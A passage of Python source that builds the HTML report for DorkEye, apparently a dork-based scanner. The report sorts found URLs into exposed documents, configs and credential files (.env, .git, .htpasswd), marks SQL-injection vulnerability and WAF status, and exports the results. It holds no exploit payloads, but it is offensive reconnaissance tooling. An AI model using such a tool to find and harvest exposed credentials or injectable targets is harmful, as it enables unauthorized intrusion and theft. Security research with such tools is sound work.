        .header {{ background: rgba(0,10,0,0.85); border: 1px solid #00ff41; border-left: 4px solid #00ff41; padding: 22px 28px; margin-bottom: 24px; box-shadow: 0 0 24px rgba(0,255,65,0.15); }}
        .header h1 {{ font-size: 22px; color: #00ff41; text-shadow: 0 0 10px #00ff41; letter-spacing: 2px; }}
        .header .subtitle {{ margin-top: 6px; font-size: 12px; color: #009922; letter-spacing: 1px; }}
        .header .blink {{ animation: blink 1.1s step-end infinite; }}
        @keyframes blink {{ 50% {{ opacity: 0; }} }}
        /* ── Stats ── */
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(190px, 1fr)); gap: 12px; margin-bottom: 24px; }}
        .stat-card {{ background: rgba(0,10,0,0.82); border: 1px solid #00aa2a; padding: 16px 18px; }}
        .stat-card h3 {{ font-size: 11px; color: #009922; letter-spacing: 1px; text-transform: uppercase; }}
        .stat-card p {{ font-size: 26px; font-weight: bold; color: #00ff41; margin-top: 8px; text-shadow: 0 0 8px rgba(0,255,65,0.5); }}
        /* ── Alerts ── */
        .sqli-alert {{ background: rgba(40,0,0,0.88); border: 1px solid #ff2222; border-left: 4px solid #ff2222; padding: 14px 20px; margin-bottom: 20px; color: #ff4444; }}
        .sqli-alert h2 {{ font-size: 15px; letter-spacing: 2px; margin-bottom: 6px; }}
        .sqli-alert p  {{ font-size: 13px; color: #ff6666; }}
        .waf-alert {{ background: rgba(30,20,0,0.88); border: 1px solid #ffaa00; border-left: 4px solid #ffaa00; padding: 12px 20px; margin-bottom: 14px; color: #ffcc44; font-size: 13px; }}
        /* ── Toolbar: filter + export ── */
        .toolbar {{ display: flex; align-items: flex-start; gap: 12px; margin-bottom: 6px; flex-wrap: wrap; }}
        .filter-bar {{ display: flex; gap: 8px; align-items: center; flex-wrap: wrap; flex: 1; position: relative; }}
        .filter-label {{ color: #009922; font-size: 12px; letter-spacing: 1px; margin-right: 4px; white-space: nowrap; }}
        .filter-group {{ position: relative; display: inline-block; }}
        .filter-btn {{ background: rgba(0,10,0,0.7); border: 1px solid #00aa2a; color: #00aa2a; padding: 5px 14px; font-family: 'Courier New', monospace; font-size: 11px; cursor: pointer; letter-spacing: 2px; text-transform: uppercase; transition: all .15s; white-space: nowrap; display: inline-flex; align-items: center; gap: 6px; }}
        .filter-btn:hover {{ background: rgba(0,255,65,0.12); border-color: #00ff41; color: #00ff41; }}
        .filter-btn.active {{ background: #00ff41; color: #000; border-color: #00ff41; font-weight: bold; }}
        .badge {{ display: inline-block; background: rgba(0,255,65,0.15); border: 1px solid #009922; color: #00ff41; font-size: 9px; padding: 1px 5px; border-radius: 2px; min-width: 20px; text-align: center; }}
        .filter-btn.active .badge {{ background: rgba(0,0,0,0.25); color: #000; }}
        .has-sub .arrow {{ font-size: 8px; opacity: 0.7; transition: transform 0.2s; }}
        .sub-menu {{ display: none; position: absolute; top: calc(100% + 3px); left: 0; z-index: 200; background: rgba(0,6,0,0.97); border: 1px solid #00aa2a; border-top: 2px solid #00ff41; box-shadow: 0 6px 24px rgba(0,255,65,0.18); min-width: 160px; max-height: 0; opacity: 0; transition: max-height 0.25s ease, opacity 0.2s ease; }}
        .sub-menu.open {{ display: block; max-height: 300px; opacity: 1; }}
        .sub-btn {{ display: flex; align-items: center; justify-content: space-between; width: 100%; background: transparent; border: none; border-bottom: 1px solid rgba(0,170,42,0.18); color: #009922; padding: 8px 16px; font-family: 'Courier New', monospace; font-size: 11px; letter-spacing: 1.5px; text-transform: uppercase; cursor: pointer; text-align: left; transition: all .12s; gap: 8px; }}
        .sub-btn:last-child {{ border-bottom: none; }}
        .sub-btn:hover {{ background: rgba(0,255,65,0.08); color: #00ff41; padding-left: 22px; }}
        .sub-btn.active {{ color: #00ff41; font-weight: bold; background: rgba(0,255,65,0.06); padding-left: 22px; }}
        .sub-btn .sub-badge {{ font-size: 9px; color: #005500; background: rgba(0,255,65,0.08); border: 1px solid #003300; padding: 1px 5px; border-radius: 2px; min-width: 22px; text-align: center; }}
        .active-sub-info {{ font-size: 11px; color: #005500; letter-spacing: 1px; margin-bottom: 10px; min-height: 16px; padding-left: 2px; }}
        .active-sub-info span {{ color: #00aa44; }}
        /* ── Export panel ── */
        .export-wrap {{ position: relative; flex-shrink: 0; }}
        .export-toggle {{ background: rgba(0,10,0,0.7); border: 1px solid #007acc; color: #00aaff; padding: 5px 14px; font-family: 'Courier New', monospace; font-size: 11px; cursor: pointer; letter-spacing: 2px; text-transform: uppercase; display: inline-flex; align-items: center; gap: 6px; transition: all .15s; white-space: nowrap; }}
        .export-toggle:hover, .export-toggle.open {{ background: rgba(0,120,200,0.15); border-color: #00aaff; color: #fff; }}
        .export-panel {{ display: none; position: absolute; top: calc(100% + 4px); right: 0; z-index: 300; background: rgba(0,4,12,0.98); border: 1px solid #007acc; border-top: 2px solid #00aaff; box-shadow: 0 8px 32px rgba(0,120,200,0.25); min-width: 380px; padding: 0; }}
        .export-panel.open {{ display: block; animation: fadeIn .15s ease; }}
        @keyframes fadeIn {{ from {{ opacity:0; transform:translateY(-4px); }} to {{ opacity:1; transform:none; }} }}
        .ep-section {{ padding: 10px 16px; border-bottom: 1px solid rgba(0,100,180,0.2); }}
        .ep-section:last-child {{ border-bottom: none; }}
        .ep-title {{ font-size: 10px; color: #005588; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 8px; }}
        .ep-row {{ display: flex; align-items: center; gap: 6px; margin-bottom: 5px; }}
        .ep-row:last-child {{ margin-bottom: 0; }}
        .ep-label {{ font-size: 11px; color: #0088bb; letter-spacing: 1px; min-width: 110px; flex-shrink: 0; }}
        .ep-label.warn {{ color: #ffaa00; }}
        .ep-label.danger {{ color: #ff4444; }}
        .ep-label.safe-lbl {{ color: #00cc55; }}
        .ep-label.view-lbl {{ color: #cc88ff; }}
        .exp-btn {{ background: transparent; border: 1px solid currentColor; padding: 3px 10px; font-family: 'Courier New', monospace; font-size: 10px; cursor: pointer; letter-spacing: 1.5px; text-transform: uppercase; transition: all .12s; }}
        .exp-btn.txt {{ color: #00ccff; border-color: #00ccff; }}
        .exp-btn.txt:hover {{ background: #00ccff; color: #000; }}
        .exp-btn.json {{ color: #ffcc00; border-color: #ffcc00; }}
        .exp-btn.json:hover {{ background: #ffcc00; color: #000; }}
        .exp-btn.csv {{ color: #00ff99; border-color: #00ff99; }}
        .exp-btn.csv:hover {{ background: #00ff99; color: #000; }}
        .ep-divider {{ border: none; border-top: 1px solid rgba(0,100,180,0.15); margin: 2px 0; }}
        .ep-count {{ font-size: 9px; color: #004466; margin-left: auto; letter-spacing: 1px; }}
        /* ── Table ── */
        .table-wrap {{ background: rgba(0,8,0,0.82); border: 1px solid #00aa2a; overflow-x: auto; }}
        table {{ width: 100%; border-collapse: collapse; }}
        th {{ background: rgba(0,255,65,0.06); color: #00ff41; padding: 11px 14px; text-align: left; border-bottom: 1px solid #00aa2a; font-size: 11px; letter-spacing: 2px; text-transform: uppercase; white-space: nowrap; }}
        td {{ padding: 9px 14px; border-bottom: 1px solid rgba(0,170,42,0.15); font-size: 12px; vertical-align: middle; }}
        tr:hover td {{ background: rgba(0,255,65,0.04); }}
        tr.hidden {{ display: none; }}
        a {{ color: #00aaff; text-decoration: none; }}
        a:hover {{ color: #00ff41; }}
        .category {{ display: inline-block; padding: 2px 9px; border: 1px solid; font-size: 10px; letter-spacing: 1px; text-transform: uppercase; }}
        .category-documents   {{ border-color: #ff6b6b; color: #ff6b6b; }}
        .category-archives    {{ border-color: #ffa500; color: #ffa500; }}
        .category-databases   {{ border-color: #b47fff; color: #b47fff; }}
        .category-backups     {{ border-color: #e67e22; color: #e67e22; }}
        .category-configs     {{ border-color: #1abc9c; color: #1abc9c; }}
        .category-scripts     {{ border-color: #f1c40f; color: #f1c40f; }}
        .category-webpage     {{ border-color: #7f8c8d; color: #7f8c8d; }}
        .category-credentials {{ border-color: #e74c3c; color: #e74c3c; }}
        .sqli-critical {{ color: #ff00ff; font-weight: bold; text-shadow: 0 0 6px #ff00ff; }}
        .sqli-vuln     {{ color: #ff3333; font-weight: bold; }}
        .sqli-safe     {{ color: #00ff41; }}
        .sqli-untested {{ color: #444; }}
        .waf-label     {{ font-size: 10px; color: #ffaa00; border: 1px solid #ffaa00; padding: 1px 5px; letter-spacing: 1px; }}
        .url-cell {{ display: flex; align-items: center; gap: 8px; }}
        .dl-btn {{ flex-shrink: 0; background: transparent; border: 1px solid #0077bb; color: #00aaff; padding: 2px 9px; font-size: 13px; cursor: pointer; text-decoration: none; font-family: 'Courier New', monospace; transition: all .15s; }}
        .dl-btn:hover {{ background: #00aaff; color: #000; }}
        /* ── Footer ── */
        .footer {{ margin-top: 28px; padding: 14px 0; border-top: 1px solid #002200; text-align: center; font-size: 11px; color: #004400; letter-spacing: 2px; }}
        /* ── Toast ── */
        #toast {{ position: fixed; bottom: 28px; right: 28px; z-index: 9999; background: rgba(0,20,0,0.95); border: 1px solid #00ff41; color: #00ff41; padding: 10px 20px; font-family: 'Courier New', monospace; font-size: 12px; letter-spacing: 1px; opacity: 0; transition: opacity .3s; pointer-events: none; }}
        #toast.show {{ opacity: 1; }}
    </style>
</head>
<body>
<canvas id="matrix-canvas"></canvas>
<div id="content">
    <div class="header">
        <h1>&#9632; DorkEye | Report <span class="blink">_</span></h1>
        <div class="subtitle">&#10132; Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} &nbsp;|&nbsp; xploits3c.github.io/DorkEye</div>
    </div>
"""
        if sqli_count > 0:
            html += f"""    <div class="sqli-alert">
        <h2>&#9888; SECURITY ALERT &#9888;</h2>
        <p><strong>{sqli_count}</strong> potential SQL injection vulnerabilities detected!</p>
        <p>Review the results marked VULNERABLE below — use the Export panel to download them.</p>
    </div>
"""
        if waf_count > 0:
            html += f"""    <div class="waf-alert">
        &#9888; <strong>{waf_count}</strong> WAF-protected target(s) detected — SQLi results on those URLs may have false negatives.
    </div>
"""
        html += f"""    <div class="stats">
        <div class="stat-card"><h3>&#9632; TOTAL RESULTS</h3><p>{len(self.results)}</p></div>
        <div class="stat-card"><h3>&#9632; DUPLICATES FILTERED</h3><p>{self.stats.get('duplicates', 0)}</p></div>
        <div class="stat-card"><h3>&#9632; SQLI VULNERABILITIES</h3><p class="sqli-vuln">{sqli_count}</p></div>
        <div class="stat-card"><h3>&#9632; WAF DETECTED</h3><p style="color:#ffaa00">{waf_count}</p></div>
        <div class="stat-card"><h3>&#9632; EXECUTION TIME</h3><p>{round(time.time() - self.start_time, 2)}s</p></div>
    </div>

    <!-- ═══ TOOLBAR: filters + export ═══ -->
    <div class="toolbar">
      <div class="filter-bar">
        <span class="filter-label">[ FILTER ]</span>
        <button class="filter-btn active" data-group="all" onclick="applyFilter(this)">ALL <span class="badge" id="badge-all">{cnt["all"]}</span></button>
        <div class="filter-group" id="fg-doc">
            <button class="filter-btn has-sub" data-group="doc" onclick="applyFilter(this)">DOC <span class="badge" id="badge-doc">{cnt["doc"]}</span><span class="arrow">&#9660;</span></button>
            <div class="sub-menu" id="sub-doc">
                <button class="sub-btn active" data-sub="doc-all"  onclick="applySubFilter(this,'doc')">ALL      <span class="sub-badge" id="sbadge-doc-all">{cnt["doc"]}</span></button>
                <button class="sub-btn"        data-sub="doc-pdf"  onclick="applySubFilter(this,'doc')">PDF      <span class="sub-badge" id="sbadge-doc-pdf">–</span></button>
                <button class="sub-btn"        data-sub="doc-docx" onclick="applySubFilter(this,'doc')">DOCX     <span class="sub-badge" id="sbadge-doc-docx">–</span></button>
                <button class="sub-btn"        data-sub="doc-xlsx" onclick="applySubFilter(this,'doc')">XLSX     <span class="sub-badge" id="sbadge-doc-xlsx">–</span></button>
                <button class="sub-btn"        data-sub="doc-ppt"  onclick="applySubFilter(this,'doc')">PPT      <span class="sub-badge" id="sbadge-doc-ppt">–</span></button>
                <button class="sub-btn"        data-sub="doc-arc"  onclick="applySubFilter(this,'doc')">ARCHIVES <span class="sub-badge" id="sbadge-doc-arc">–</span></button>
            </div>
        </div>
        <div class="filter-group" id="fg-sqli">
            <button class="filter-btn has-sub" data-group="sqli" onclick="applyFilter(this)">SQLi <span class="badge" id="badge-sqli">{cnt["sqli"]}</span><span class="arrow">&#9660;</span></button>
            <div class="sub-menu" id="sub-sqli">
                <button class="sub-btn active" data-sub="sqli-all"      onclick="applySubFilter(this,'sqli')">SQLi ALL      <span class="sub-badge" id="sbadge-sqli-all">{sqli_total}</span></button>
                <button class="sub-btn"        data-sub="sqli-critical"  onclick="applySubFilter(this,'sqli')">SQLi CRITICAL <span class="sub-badge sqli-critical" id="sbadge-sqli-critical">–</span></button>
                <button class="sub-btn"        data-sub="sqli-vuln"     onclick="applySubFilter(this,'sqli')">SQLi VULN     <span class="sub-badge sqli-vuln" id="sbadge-sqli-vuln">{sqli_count}</span></button>
                <button class="sub-btn"        data-sub="sqli-safe"     onclick="applySubFilter(this,'sqli')">SQLi SAFE     <span class="sub-badge" id="sbadge-sqli-safe">{sqli_safe}</span></button>
            </div>
        </div>
        <div class="filter-group" id="fg-scripts">
            <button class="filter-btn has-sub" data-group="scripts" onclick="applyFilter(this)">SCRIPTS <span class="badge" id="badge-scripts">{cnt["scripts"]}</span><span class="arrow">&#9660;</span></button>
            <div class="sub-menu" id="sub-scripts">
                <button class="sub-btn active" data-sub="scripts-all"    onclick="applySubFilter(this,'scripts')">ALL     <span class="sub-badge" id="sbadge-scripts-all">{cnt["scripts"]}</span></button>
                <button class="sub-btn"        data-sub="scripts-php"    onclick="applySubFilter(this,'scripts')">PHP     <span class="sub-badge" id="sbadge-scripts-php">–</span></button>
                <button class="sub-btn"        data-sub="scripts-asp"    onclick="applySubFilter(this,'scripts')">ASP     <span class="sub-badge" id="sbadge-scripts-asp">–</span></button>
                <button class="sub-btn"        data-sub="scripts-sh"     onclick="applySubFilter(this,'scripts')">SH/BAT  <span class="sub-badge" id="sbadge-scripts-sh">–</span></button>
                <button class="sub-btn"        data-sub="scripts-config" onclick="applySubFilter(this,'scripts')">CONFIGS <span class="sub-badge" id="sbadge-scripts-config">–</span></button>
                <button class="sub-btn"        data-sub="scripts-creds"  onclick="applySubFilter(this,'scripts')">CREDS   <span class="sub-badge" id="sbadge-scripts-creds">–</span></button>
            </div>
        </div>
        <button class="filter-btn" data-group="page" onclick="applyFilter(this)">PAGE <span class="badge" id="badge-page">{cnt["page"]}</span></button>
      </div>

      <!-- ─ Export button + panel ─ -->
      <div class="export-wrap" id="exportWrap">
        <button class="export-toggle" id="exportToggle" onclick="toggleExportPanel()">&#11015; EXPORT <span style="font-size:8px;opacity:.7;">&#9660;</span></button>
        <div class="export-panel" id="exportPanel">

          <div class="ep-section">
            <div class="ep-title">&#9632; All results &nbsp;<span id="epCntAll" style="color:#006633;font-size:9px;"></span></div>
            <div class="ep-row">
              <span class="ep-label">All ({len(self.results)})</span>
              <button class="exp-btn txt" onclick="doExport('txt','all')">TXT</button>
              <button class="exp-btn json" onclick="doExport('json','all')">JSON</button>
              <button class="exp-btn csv" onclick="doExport('csv','all')">CSV</button>
            </div>
          </div>

          <div class="ep-section">
            <div class="ep-title">&#9632; SQLi — by status</div>
            <div class="ep-row">
              <span class="ep-label warn">⚠ All tested <span id="epCntSqliAll"></span></span>
              <button class="exp-btn txt"  onclick="doExport('txt','sqli-all')">TXT</button>
              <button class="exp-btn json" onclick="doExport('json','sqli-all')">JSON</button>
              <button class="exp-btn csv"  onclick="doExport('csv','sqli-all')">CSV</button>
            </div>
            <div class="ep-row">
              <span class="ep-label danger">&#9888; VULN only <span id="epCntSqliVuln"></span></span>
              <button class="exp-btn txt"  onclick="doExport('txt','sqli-vuln')">TXT</button>
              <button class="exp-btn json" onclick="doExport('json','sqli-vuln')">JSON</button>
              <button class="exp-btn csv"  onclick="doExport('csv','sqli-vuln')">CSV</button>
            </div>
            <div class="ep-row">
              <span class="ep-label safe-lbl">&#10003; SAFE only <span id="epCntSqliSafe"></span></span>
              <button class="exp-btn txt"  onclick="doExport('txt','sqli-safe')">TXT</button>
              <button class="exp-btn json" onclick="doExport('json','sqli-safe')">JSON</button>
              <button class="exp-btn csv"  onclick="doExport('csv','sqli-safe')">CSV</button>
            </div>
          </div>

          <div class="ep-section">
            <div class="ep-title">&#9632; Current view (respects active filter)</div>
            <div class="ep-row">
              <span class="ep-label view-lbl">Visible <span id="epCntView"></span></span>
              <button class="exp-btn txt"  onclick="doExport('txt','view')">TXT</button>
              <button class="exp-btn json" onclick="doExport('json','view')">JSON</button>
              <button class="exp-btn csv"  onclick="doExport('csv','view')">CSV</button>
            </div>
          </div>

        </div>
      </div>
    </div>
    <!-- ═══ end toolbar ═══ -->

    <div class="active-sub-info" id="sub-info"></div>
    <div class="table-wrap">
    <table>
        <thead><tr><th>#</th><th>URL</th><th>Title</th><th>Category</th><th>SQLi Status</th><th>WAF</th><th>Details</th></tr></thead>
        <tbody id="results-tbody">
"""
        for idx, result in enumerate(self.results, 1):
            size        = self._format_size(result.get('file_size'))
            category    = result.get('category', 'unknown')
            ext         = result.get('extension', '').lower()
            url         = result['url']
            url_display = url[:80] + ('...' if len(url) > 80 else '')

            sqli_status, sqli_class, sqli_data = "N/A", "sqli-untested", "untested"
            sqli_conf = ""
            waf_label = ""

            if "sqli_test" in result and result["sqli_test"].get("tested", False):
                conf = result["sqli_test"].get("overall_confidence", "none")
                sqli_conf = conf
                if result["sqli_test"].get("vulnerable", False):
                    if conf == SQLiConfidence.CRITICAL.value:
                        sqli_status = "&#9888; CRITICAL"
                        sqli_class  = "sqli-critical"
                        sqli_data   = "critical"
                    else:
                        sqli_status = f"VULNERABLE ({conf})"
                        sqli_class  = "sqli-vuln"
                        sqli_data   = "vuln"
                else:
                    sqli_status, sqli_class, sqli_data = "SAFE", "sqli-safe", "safe"

                waf = result["sqli_test"].get("waf_detected", "")
                if waf:
                    waf_label = f'<span class="waf-label">{waf}</span>'

            html += f"""            <tr data-category="{category}" data-ext="{ext}" data-sqli="{sqli_data}" data-conf="{sqli_conf}" data-idx="{idx-1}">
                <td>{idx}</td>
                <td><div class="url-cell"><a href="{url}" target="_blank">{url_display}</a><a class="dl-btn" href="{url}" download>&#8681;</a></div></td>
                <td>{result.get('title','N/A')[:50]}</td>
                <td><span class="category category-{category}">{category}</span></td>
                <td class="{sqli_class}">{sqli_status}</td>
                <td>{waf_label}</td>
                <td>{size}</td>
            </tr>
"""
        html += f"""        </tbody>
    </table>
    </div>
    <div class="footer">DorkEye v4.6 &nbsp;|&nbsp; xploits3c &nbsp;|&nbsp; For authorized security research only</div>
</div>

<div id="toast"></div>

<!-- ══ Embedded export data ══ -->
<script>
const EXPORT_DATA = {export_data_js};
const REPORT_BASE = "{report_base}";
</script>

<script>
/* ═══════════════════════════════════════════════
   Matrix rain
═══════════════════════════════════════════════ */
(function(){{
    const c=document.getElementById('matrix-canvas'),ctx=c.getContext('2d');
    const CH='アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789ABCDEF';
    const FS=14;let cols,drops;
    function resize(){{c.width=window.innerWidth;c.height=window.innerHeight;cols=Math.floor(c.width/FS);drops=Array.from({{length:cols}},()=>Math.random()*-100);}}
    function draw(){{ctx.fillStyle='rgba(0,0,0,0.05)';ctx.fillRect(0,0,c.width,c.height);for(let i=0;i<cols;i++){{const ch=CH[Math.floor(Math.random()*CH.length)];ctx.fillStyle=Math.random()>.95?'#fff':'#00ff41';ctx.font=FS+'px monospace';ctx.fillText(ch,i*FS,drops[i]*FS);if(drops[i]*FS>c.height&&Math.random()>.975)drops[i]=0;drops[i]+=.5+Math.random()*.5;}}}}
    resize();window.addEventListener('resize',resize);setInterval(draw,45);
}})();

/* ═══════════════════════════════════════════════
   Filter logic
═══════════════════════════════════════════════ */
const GROUP_CATS={{
  "doc":["documents","archives","backups"],
  "scripts":["scripts","configs","credentials"],
  "page":["webpage"]
}};
const SUB_PRED={{
  "doc-all":()=>true,
  "doc-pdf":(r)=>r.dataset.ext===".pdf",
  "doc-docx":(r)=>[".doc",".docx",".odt"].includes(r.dataset.ext),
  "doc-xlsx":(r)=>[".xls",".xlsx",".ods"].includes(r.dataset.ext),
  "doc-ppt":(r)=>[".ppt",".pptx"].includes(r.dataset.ext),
  "doc-arc":(r)=>[".zip",".rar",".tar",".gz",".7z",".bz2"].includes(r.dataset.ext),
  "sqli-all":(r)=>["vuln","safe","critical"].includes(r.dataset.sqli),
  "sqli-critical":(r)=>r.dataset.sqli==="critical",
  "sqli-vuln":(r)=>["vuln","critical"].includes(r.dataset.sqli),
  "sqli-safe":(r)=>r.dataset.sqli==="safe",
  "scripts-all":()=>true,
  "scripts-php":(r)=>r.dataset.ext===".php",
  "scripts-asp":(r)=>[".asp",".aspx"].includes(r.dataset.ext),
  "scripts-sh":(r)=>[".sh",".bat",".ps1"].includes(r.dataset.ext),
  "scripts-config":(r)=>[".conf",".config",".ini",".yaml",".yml",".json",".xml"].includes(r.dataset.ext),
  "scripts-creds":(r)=>[".env",".git",".svn",".htpasswd"].includes(r.dataset.ext)
}};
let activeGroup="all",activeSub=null;
function closeAllSubMenus(){{document.querySelectorAll('.sub-menu.open').forEach(m=>{{m.classList.remove('open');m.style.maxHeight='0';m.style.opacity='0';}});document.querySelectorAll('.filter-btn.has-sub').forEach(b=>b.classList.remove('active'));}}
function toggleSubMenu(g){{const m=document.getElementById('sub-'+g);if(!m)return;const o=m.classList.contains('open');closeAllSubMenus();if(!o){{m.classList.add('open');m.style.maxHeight='300px';m.style.opacity='1';}}}}
function applyFilter(btn){{
  const group=btn.dataset.group;
  if(btn.classList.contains('has-sub')){{
    if(activeGroup===group){{toggleSubMenu(group);return;}}
    activeGroup=group;activeSub=group+'-all';
    document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));
    btn.classList.add('active');
    const menu=document.getElementById('sub-'+group);
    if(menu){{menu.querySelectorAll('.sub-btn').forEach(b=>b.classList.remove('active'));menu.querySelector('.sub-btn').classList.add('active');}}
    toggleSubMenu(group);
  }}else{{
    closeAllSubMenus();
    document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));
    btn.classList.add('active');activeGroup=group;activeSub=null;
  }}
  renderRows();updateInfoBar();updateExportCounts();
}}
function applySubFilter(btn,groupId){{
  btn.closest('.sub-menu').querySelectorAll('.sub-btn').forEach(b=>b.classList.remove('active'));
  btn.classList.add('active');activeSub=btn.dataset.sub;
  renderRows();updateInfoBar();updateExportCounts();
}}
function renderRows(){{
  const rows=document.querySelectorAll('#results-tbody tr');
  const pred=activeSub?(SUB_PRED[activeSub]||(()=>true)):(()=>true);
  rows.forEach(row=>{{
    if(activeGroup==='all'){{row.classList.remove('hidden');return;}}
    if(activeGroup==='sqli'){{pred(row)?row.classList.remove('hidden'):row.classList.add('hidden');return;}}
    const cats=GROUP_CATS[activeGroup]||[];
    const inGroup=cats.includes(row.dataset.category||'');
    (inGroup&&pred(row))?row.classList.remove('hidden'):row.classList.add('hidden');
  }});
}}
function buildSubBadges(){{
  const rows=Array.from(document.querySelectorAll('#results-tbody tr'));
  const inGroup=cats=>(row)=>cats.includes(row.dataset.category||'');
  const docRows=rows.filter(inGroup(GROUP_CATS['doc']));
  const sqliRows=rows.filter(r=>["vuln","safe","critical"].includes(r.dataset.sqli));
  const scriptsRows=rows.filter(inGroup(GROUP_CATS['scripts']));
  const set=(id,n)=>{{const el=document.getElementById(id);if(el)el.textContent=n;}};
  set('sbadge-doc-all',docRows.length);
  set('sbadge-doc-pdf',docRows.filter(r=>r.dataset.ext==='.pdf').length);
  set('sbadge-doc-docx',docRows.filter(r=>['.doc','.docx','.odt'].includes(r.dataset.ext)).length);
  set('sbadge-doc-xlsx',docRows.filter(r=>['.xls','.xlsx','.ods'].includes(r.dataset.ext)).length);
  set('sbadge-doc-ppt',docRows.filter(r=>['.ppt','.pptx'].includes(r.dataset.ext)).length);
  set('sbadge-doc-arc',docRows.filter(r=>['.zip','.rar','.tar','.gz','.7z','.bz2'].includes(r.dataset.ext)).length);
  set('sbadge-sqli-all',sqliRows.length);
  set('sbadge-sqli-critical',sqliRows.filter(r=>r.dataset.sqli==='critical').length);
  set('sbadge-sqli-vuln',sqliRows.filter(r=>['vuln','critical'].includes(r.dataset.sqli)).length);
  set('sbadge-sqli-safe',sqliRows.filter(r=>r.dataset.sqli==='safe').length);
  set('sbadge-scripts-all',scriptsRows.length);
  set('sbadge-scripts-php',scriptsRows.filter(r=>r.dataset.ext==='.php').length);
  set('sbadge-scripts-asp',scriptsRows.filter(r=>['.asp','.aspx'].includes(r.dataset.ext)).length);
  set('sbadge-scripts-sh',scriptsRows.filter(r=>['.sh','.bat','.ps1'].includes(r.dataset.ext)).length);
  set('sbadge-scripts-config',scriptsRows.filter(r=>['.conf','.config','.ini','.yaml','.yml','.json','.xml'].includes(r.dataset.ext)).length);
  set('sbadge-scripts-creds',scriptsRows.filter(r=>['.env','.git','.svn','.htpasswd'].includes(r.dataset.ext)).length);
}}
function updateInfoBar(){{
  const bar=document.getElementById('sub-info');if(!bar)return;
  const visible=document.querySelectorAll('#results-tbody tr:not(.hidden)').length;
  if(activeGroup==='all'||!activeSub){{
    bar.innerHTML=`&#10142; Showing <span>${{visible}}</span> result(s)`;
  }}else{{
    const subLabel=activeSub.split('-').slice(1).join(' ').toUpperCase();
    const grpLabel=activeGroup.toUpperCase();
    bar.innerHTML=`&#10142; Filter: <span>${{grpLabel}}</span> &rsaquo; <span>${{subLabel}}</span> &mdash; <span>${{visible}}</span> result(s) visible`;
  }}
}}
document.addEventListener('click',(e)=>{{
  if(!e.target.closest('.filter-group')&&!e.target.closest('.filter-btn[data-group]')){{
    closeAllSubMenus();
    document.querySelectorAll('.filter-btn').forEach(b=>{{if(b.dataset.group===activeGroup)b.classList.add('active');}});
  }}
  if(!e.target.closest('#exportWrap'))closeExportPanel();
}});

/* ═══════════════════════════════════════════════
   Export panel
═══════════════════════════════════════════════ */
function toggleExportPanel(){{
  const panel=document.getElementById('exportPanel');
  const toggle=document.getElementById('exportToggle');
  const open=panel.classList.contains('open');
  if(open){{panel.classList.remove('open');toggle.classList.remove('open');}}
  else{{panel.classList.add('open');toggle.classList.add('open');updateExportCounts();closeAllSubMenus();}}
}}
function closeExportPanel(){{
  document.getElementById('exportPanel').classList.remove('open');
  document.getElementById('exportToggle').classList.remove('open');
}}

function updateExportCounts(){{
  const sqliAll  = EXPORT_DATA.filter(r=>['vuln','safe','critical'].includes(r.sqli));
  const sqliVuln = EXPORT_DATA.filter(r=>['vuln','critical'].includes(r.sqli));
  const sqliSafe = EXPORT_DATA.filter(r=>r.sqli==='safe');
  const viewRows = Array.from(document.querySelectorAll('#results-tbody tr:not(.hidden)'));
  const viewIdxs = new Set(viewRows.map(r=>parseInt(r.dataset.idx)));
  const viewData = EXPORT_DATA.filter((_,i)=>viewIdxs.has(i));
  const s=(id,n,label)=>{{const el=document.getElementById(id);if(el)el.textContent=`(${{n}})`;}}; 
  s('epCntSqliAll', sqliAll.length);
  s('epCntSqliVuln',sqliVuln.length);
  s('epCntSqliSafe',sqliSafe.length);
  s('epCntView',    viewData.length);
}}

function _getRows(scope){{
  if(scope==='all')       return EXPORT_DATA;
  if(scope==='sqli-all')  return EXPORT_DATA.filter(r=>['vuln','safe','critical'].includes(r.sqli));
  if(scope==='sqli-vuln') return EXPORT_DATA.filter(r=>['vuln','critical'].includes(r.sqli));
  if(scope==='sqli-safe') return EXPORT_DATA.filter(r=>r.sqli==='safe');
  if(scope==='view'){{
    const viewIdxs=new Set(Array.from(document.querySelectorAll('#results-tbody tr:not(.hidden)')).map(r=>parseInt(r.dataset.idx)));
    return EXPORT_DATA.filter((_,i)=>viewIdxs.has(i));
  }}
  return EXPORT_DATA;
}}

function _scopeLabel(scope){{
  return {{
    'all':'all','sqli-all':'sqli_tested','sqli-vuln':'sqli_vuln',
    'sqli-safe':'sqli_safe','view':'view'
  }}[scope]||scope;
}}

function _download(content, filename, mime){{
  const blob=new Blob([content],{{type:mime}});
  const a=document.createElement('a');
  a.href=URL.createObjectURL(blob);
  a.download=filename;
  document.body.appendChild(a);a.click();
  setTimeout(()=>{{URL.revokeObjectURL(a.href);document.body.removeChild(a);}},100);
}}

function _showToast(msg){{
  const t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');
  setTimeout(()=>t.classList.remove('show'),2200);
}}

function doExport(fmt, scope){{
  const rows=_getRows(scope);
  if(!rows.length){{_showToast('No results to export for this filter.');return;}}
  const ts=new Date().toISOString().slice(0,19).replace(/[:T]/g,'-');
  const base=`${{REPORT_BASE}}_${{_scopeLabel(scope)}}_${{ts}}`;

  if(fmt==='txt'){{
    const lines=rows.map((r,i)=>{{
      let s=`${{i+1}}. ${{r.url}}\\n`;
      if(r.title) s+=`   Title    : ${{r.title}}\\n`;
      if(r.category) s+=`   Category : ${{r.category}}\\n`;
      if(r.dork)  s+=`   Dork     : ${{r.dork}}\\n`;
      if(r.sqli&&r.sqli!=='untested') s+=`   SQLi     : ${{r.sqli.toUpperCase()}}${{r.conf?' ('+r.conf+')':''}}\\n`;
      if(r.waf)   s+=`   WAF      : ${{r.waf}}\\n`;
      s+=`   Time     : ${{r.timestamp}}\\n`;
      return s;
    }});
    _download('DorkEye Export — '+scope.toUpperCase()+'\\nGenerated: '+ts+'\\nTotal: '+rows.length+'\\n\\n'+lines.join('\\n'), base+'.txt', 'text/plain');
    _showToast(`Exported ${{rows.length}} rows → ${{base}}.txt`);
  }}

  else if(fmt==='json'){{
    const payload={{
      meta:{{generated:ts,scope:scope,total:rows.length,report:REPORT_BASE}},
      results:rows
    }};
    _download(JSON.stringify(payload,null,2), base+'.json', 'application/json');
    _showToast(`Exported ${{rows.length}} rows → ${{base}}.json`);
